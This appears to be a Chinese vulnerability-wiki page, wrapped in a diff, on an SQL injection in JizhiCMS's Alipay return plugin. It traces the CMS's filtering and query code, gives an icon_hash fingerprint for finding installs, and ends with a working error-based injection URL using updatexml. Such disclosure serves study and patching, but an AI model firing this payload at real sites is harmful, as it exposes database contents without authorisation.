@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS%20alipay_return_pay%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>极致CMS alipay_return_pay SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6781\u81f4CMS alipay_return_pay SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9E%81%E8%87%B4CMS%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9E%81%E8%87%B4CMS%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        极致CMS 后台文件编辑插件 后台任意文件写入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%9E%81%E7%AE%80%E4%BA%91/%E6%9E%81%E7%AE%80%E4%BA%91%E9%AA%8C%E8%AF%81%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%9E%81%E7%AE%80%E4%BA%91/%E6%9E%81%E7%AE%80%E4%BA%91%E9%AA%8C%E8%AF%81%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        极简云验证系统存在敏感信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cms-alipay_return_pay-sql">极致CMS alipay_return_pay SQL注入漏洞<a class="headerlink" href="#cms-alipay_return_pay-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息 </p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>极致CMS</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>icon_hash="1657387632"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1633500278668-c9cbbe05-5213-4454-a608-5f5cbe1c9e1b.png" /></p>
+<p>查看一下进行过滤的函数</p>
+<div class="highlight"><pre><span></span><code><span class="x">/**</span>
+<span class="x">    参数过滤，格式化</span>
+<span class="x">**/</span>
+<span class="x">function format_param($value=null,$int=0){</span>
+<span class="x">    if($value==null){ return &#39;&#39;;}</span>
+<span class="x">    switch ($int){</span>
+<span class="x">        case 0://整数</span>
+<span class="x">            return (int)$value;</span>
+<span class="x">        case 1://字符串</span>
+<span class="x">            $value=htmlspecialchars(trim($value), ENT_QUOTES);</span>
+<span class="x">            if(version_compare(PHP_VERSION,&#39;7.4&#39;,&#39;&gt;=&#39;)){</span>
+<span class="x">                $value = addslashes($value);</span>
+<span class="x">            }else{</span>
+<span class="x">                if(!get_magic_quotes_gpc())$value = addslashes($value);</span>
+<span class="x">            }</span>
+
+<span class="x">            return $value;</span>
+<span class="x">        case 2://数组</span>
+<span class="x">            if($value==&#39;&#39;)return &#39;&#39;;</span>
+<span class="x">            array_walk_recursive($value, &quot;array_format&quot;);</span>
+<span class="x">            return $value;</span>
+<span class="x">        case 3://浮点</span>
+<span class="x">            return (float)$value;</span>
+<span class="x">        case 4:</span>
+<span class="x">            if(version_compare(PHP_VERSION,&#39;7.4&#39;,&#39;&gt;=&#39;)){</span>
+<span class="x">                $value = addslashes($value);</span>
+<span class="x">            }else{</span>
+<span class="x">                if(!get_magic_quotes_gpc())$value = addslashes($value);</span>
+<span class="x">            }</span>
+<span class="x">            return trim($value);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+
+<span class="x">//过滤XSS攻击</span>
+<span class="x">function SafeFilter(&amp;$arr) </span>
+<span class="x">{</span>
+<span class="x">   $ra=Array(&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;,&#39;/script/&#39;,&#39;/javascript/&#39;,&#39;/vbscript/&#39;,&#39;/expression/&#39;,&#39;/applet/&#39;</span>
+<span class="x">   ,&#39;/meta/&#39;,&#39;/xml/&#39;,&#39;/blink/&#39;,&#39;/link/&#39;,&#39;/style/&#39;,&#39;/embed/&#39;,&#39;/object/&#39;,&#39;/frame/&#39;,&#39;/layer/&#39;,&#39;/title/&#39;,&#39;/bgsound/&#39;</span>
+<span class="x">   ,&#39;/base/&#39;,&#39;/onload/&#39;,&#39;/onunload/&#39;,&#39;/onchange/&#39;,&#39;/onsubmit/&#39;,&#39;/onreset/&#39;,&#39;/onselect/&#39;,&#39;/onblur/&#39;,&#39;/onfocus/&#39;,</span>
+<span class="x">   &#39;/onabort/&#39;,&#39;/onkeydown/&#39;,&#39;/onkeypress/&#39;,&#39;/onkeyup/&#39;,&#39;/onclick/&#39;,&#39;/ondblclick/&#39;,&#39;/onmousedown/&#39;,&#39;/onmousemove/&#39;</span>
+<span class="x">   ,&#39;/onmouseout/&#39;,&#39;/onmouseover/&#39;,&#39;/onmouseup/&#39;,&#39;/onunload/&#39;);</span>
+
+<span class="x">   if (is_array($arr))</span>
+<span class="x">   {</span>
+<span class="x">     foreach ($arr as $key =&gt; $value) </span>
+<span class="x">     {</span>
+<span class="x">        if (!is_array($value))</span>
+<span class="x">        {</span>
+<span class="x">            if(version_compare(PHP_VERSION,&#39;7.4&#39;,&#39;&gt;=&#39;)){</span>
+<span class="x">                $value  = addslashes($value); </span>
+<span class="x">            }else{</span>
+<span class="x">                if (!get_magic_quotes_gpc()){</span>
+<span class="x">                    $value  = addslashes($value); </span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">          $value = preg_replace($ra,&#39;&#39;,$value);     //删除非打印字符，粗暴式过滤xss可疑字符串</span>
+<span class="x">          $arr[$key]     = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
+<span class="x">        }</span>
+<span class="x">        else</span>
+<span class="x">        {</span>
+<span class="x">          SafeFilter($arr[$key]);</span>
+<span class="x">        }</span>
+<span class="x">     }</span>
+<span class="x">   }</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>看一下执行的SQL语句的函数</p>
+<div class="highlight"><pre><span></span><code><span class="x"> // 查询一条</span>
+<span class="x">    public function find($where=null,$order=null,$fields=null,$limit=1)</span>
+<span class="x">    {</span>
+<span class="x">       if( $record = $this-&gt;findAll($where, $order, $fields, 1) ){</span>
+<span class="x">            return array_pop($record);</span>
+<span class="x">        }else{</span>
+<span class="x">            return FALSE;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>跟进 findAll 函数</p>
+<div class="highlight"><pre><span></span><code><span class="x">// 查询所有</span>
+<span class="x">    public function findAll($conditions=null,$order=null,$fields=null,$limit=null)</span>
+<span class="x">    {</span>
+<span class="x">        $where = &#39;&#39;;</span>
+<span class="x">        if(is_array($conditions)){</span>
+<span class="x">            $join = array();</span>
+<span class="x">            foreach( $conditions as $key =&gt; $value ){</span>
+<span class="x">                $value =  &#39;\&#39;&#39;.$value.&#39;\&#39;&#39;;</span>
+<span class="x">                $join[] = &quot;{$key} = {$value}&quot;;</span>
+<span class="x">            }</span>
+<span class="x">            $where = &quot;WHERE &quot;.join(&quot; AND &quot;,$join);</span>
+<span class="x">        }else{</span>
+<span class="x">            if(null != $conditions)$where = &quot;WHERE &quot;.$conditions;</span>
+<span class="x">        }</span>
+<span class="x">      if(is_array($order)){</span>
+<span class="x">            $where .= &#39; ORDER BY &#39;;</span>
+<span class="x">            $where .= implode(&#39;,&#39;, $order);</span>
+<span class="x">      }else{</span>
+<span class="x">         if($order!=null)$where .= &quot; ORDER BY  &quot;.$order;</span>
+<span class="x">      }</span>
+
+<span class="x">        if(!empty($limit))$where .= &quot; LIMIT {$limit}&quot;;</span>
+<span class="x">        $fields = empty($fields) ? &quot;*&quot; : $fields;</span>
+
+<span class="x">        $sql = &quot;SELECT {$fields} FROM {$this-&gt;table} {$where}&quot;;</span>
+
+<span class="x">        return $this-&gt;getData($sql);</span>
+
+<span class="x">    }</span>
+</code></pre></div>
+<p>在跟进一下getData函数</p>
+<div class="highlight"><pre><span></span><code><span class="x">//获取数据</span>
+<span class="x">    public function getData($sql)</span>
+<span class="x">    {</span>
+<span class="x">        if(!$result = $this-&gt;query($sql))return array();</span>
+<span class="x">        if(!$this-&gt;Statement-&gt;rowCount())return array();</span>
+<span class="x">        $rows = array();</span>
+<span class="x">        while($rows[] = $this-&gt;Statement-&gt;fetch(PDO::FETCH_ASSOC)){}</span>
+<span class="x">        $this-&gt;Statement=null;</span>
+<span class="x">        array_pop($rows);</span>
+<span class="x">        return $rows;</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>跟进query执行函数</p>
+<div class="highlight"><pre><span></span><code><span class="x">//执行SQL语句并检查是否错误</span>
+<span class="x">    public function query($sql){</span>
+<span class="x">        $this-&gt;filter[] = $sql;</span>
+<span class="x">        $this-&gt;Statement = $this-&gt;pdo-&gt;query($sql);</span>
+<span class="x">        if ($this-&gt;Statement) {</span>
+<span class="x">            return $this;</span>
+<span class="x">        }else{</span>
+<span class="x">            $msg = $this-&gt;pdo-&gt;errorInfo();</span>
+<span class="x">            if($msg[2]) exit(&#39;数据库错误：&#39; . $msg[2] . end($this-&gt;filter));</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</code></pre></div>
+<ul>
+<li>✅看到<code>$msg = $this-&gt;pdo-&gt;errorInfo();</code>语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出</li>
+<li>✅一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过<code>format_param</code>过滤，会产生注入</li>
+</ul>
+<p>例如:</p>
+<div class="highlight"><pre><span></span><code><span class="x">function exploit(){</span>
+<span class="x">    M(&#39;member&#39;)-&gt;find([&#39;username&#39;=&gt;$_GET[&#39;name&#39;]]);</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>如果直接这样GET POST REQUEST 带入数据库 会产生报错注入</p>
+<p>例如  ./exploit/name=123'  (加一个引号会报错，如果引号没过滤)</p>
+<p>现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了</p>
+<p>简单寻找下其实这样的地方挺多的，拿一个位置举例子</p>
+<p><img alt="img" src="../../../.vuepress/public/img/jizhi-5.jpg" /></p>
+<p>这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证</p>
+<p>可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入</p>
+<p><img alt="img" src="../../../.vuepress/public/img/jizhi-6.jpg" /></p>
+<p>可以看到的确出现了sql语句和数据库错误,直接报错注入获取敏感信息</p>
+<p><code>mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+"</code></p>
+<p><img alt="image-20220313235238670" src="../../../.vuepress/public/img/image-20220313235238670.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9E%81%E8%87%B4CMS%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9E%81%E8%87%B4CMS%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        极致CMS 后台文件编辑插件 后台任意文件写入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%9E%81%E7%AE%80%E4%BA%91/%E6%9E%81%E7%AE%80%E4%BA%91%E9%AA%8C%E8%AF%81%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%9E%81%E7%AE%80%E4%BA%91/%E6%9E%81%E7%AE%80%E4%BA%91%E9%AA%8C%E8%AF%81%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        极简云验证系统存在敏感信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
